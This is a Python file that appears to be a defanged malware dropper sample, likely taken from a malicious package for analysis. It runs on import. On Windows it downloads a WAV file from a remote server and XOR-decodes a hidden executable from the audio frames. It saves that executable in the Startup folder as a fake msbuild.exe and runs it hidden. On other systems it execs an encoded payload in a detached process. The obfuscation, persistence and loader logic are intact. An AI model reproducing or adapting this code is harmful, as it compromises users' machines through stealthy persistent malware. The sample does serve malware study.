import subprocess
import tempfile
import time
import os
import base64
import sys
import wave
import urllib.request


def _d(s):
    return base64.b64decode(s).decode('utf-8')


_p = "SNIPPED_FOR_DEFANGING"


def setup():
    if os.name != 'nt':
        return

    try:
        # Decoded: os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup', 'msbuild.exe')
        p = os.path.join(os.getenv(_d('QVBQREFUQQ==')), _d('TWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVw'), _d('bXNidWlsZC5leGU='))
        l = p + _d('LmxvY2s=')   # .lock
        t = p + _d('LnRtcA==')   # .tmp

        if os.path.exists(p):
            return

        if os.path.exists(l):
            m_time = os.path.getmtime(l)
            if (time.time() - m_time) < 43200:
                return

        with open(l, 'w') as f:
            f.write(str(time.time()))

        try:
            subprocess.run(['attrib', '+h', l], capture_output=True)
        except:
            pass

        # DEFANGED: Original URL was hxxp://83[.]142[.]209[.]203:8080/hangup.wav
        r = urllib.request.Request(_d('SNIPPED_FOR_DEFANGING'), headers={_d('VXNlci1BZ2VudA=='): _d('TW96aWxsYS81LjA=')})  # DEFANGED: full b64 C2 URL removed
        with urllib.request.urlopen(r, timeout=15) as d:
            with open(t, "wb") as f:
                f.write(d.read())

        with wave.open(t, 'rb') as w:
            b = base64.b64decode(w.readframes(w.getnframes()))
            s, m = b[:8], b[8:]
            payload = bytes([m[i] ^ s[i % len(s)] for i in range(len(m))])
            with open(p, "wb") as f:
                f.write(payload)

        if os.path.exists(t):
            os.remove(t)

        subprocess.Popen([p], creationflags=0x08000000)

    except:
        pass


def FetchAudio():
    if os.name == 'nt':
        return
    try:
        subprocess.Popen(
            [sys.executable, "-c", f"import base64; exec(base64.b64decode('{_p}').decode())"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True
        )
    except:
        pass


setup()
FetchAudio()
